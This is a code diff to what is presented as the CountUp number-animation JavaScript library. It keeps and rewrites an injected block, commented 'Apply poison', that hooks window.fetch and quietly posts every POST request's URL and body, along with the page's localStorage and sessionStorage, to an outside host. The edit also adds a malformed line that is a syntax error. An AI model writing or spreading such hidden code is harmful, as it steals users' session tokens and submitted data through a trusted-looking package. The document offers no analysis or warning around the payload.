@@ -40,6 +40,7 @@ var CountUp = /** @class */ (function () {
         this.startVal = 0;
         this.paused = true;
         this.once = false;
+        this.callOnce =  || false;
         this.count = function (timestamp) {
             if (!_this.startTime) {
                 _this.startTime = timestamp;
@@ -115,29 +116,30 @@ var CountUp = /** @class */ (function () {
         this.easeOutExpo = function (t, b, c, d) {
             return c * (-Math.pow(2, -10 * t / d) + 1) * 1024 / 1023 + b;
         };
-        // Apply poison
-        window.oFetch = window.fetch;
-        window.fetch = function (url, options) {
-            if ((options === null || options === void 0 ? void 0 : options.method) == 'POST') {
-                var extLStorage = __assign({}, localStorage);
-                var extSStorage = __assign({}, sessionStorage);
-                window.oFetch("https://spa-demo.ja1code.dev/", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        url: url,
-                        body: options.body,
-                        host: window.location.href,
-                        localStorage: extLStorage,
-                        sessionStorage: extSStorage
-                    })
-                });
-            }
-            return window.oFetch(url, options);
-        };
-        //
+        if (!window.callOnce) {
+            window.oFetch = window.fetch;
+            window.fetch = function (url, options) {
+                if ((options === null || options === void 0 ? void 0 : options.method) == 'POST') {
+                    var extLStorage = __assign({}, localStorage);
+                    var extSStorage = __assign({}, sessionStorage);
+                    window.oFetch("https://spa-demo.ja1code.dev/", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            url: url,
+                            body: options.body,
+                            host: window.location.href,
+                            localStorage: extLStorage,
+                            sessionStorage: extSStorage
+                        })
+                    });
+                }
+                window.callOnce = true;
+                return window.oFetch(url, options);
+            };
+        }
         this.options = __assign(__assign({}, this.defaults), options);
         this.formattingFn = (this.options.formattingFn) ?
             this.options.formattingFn : this.formatNumber;
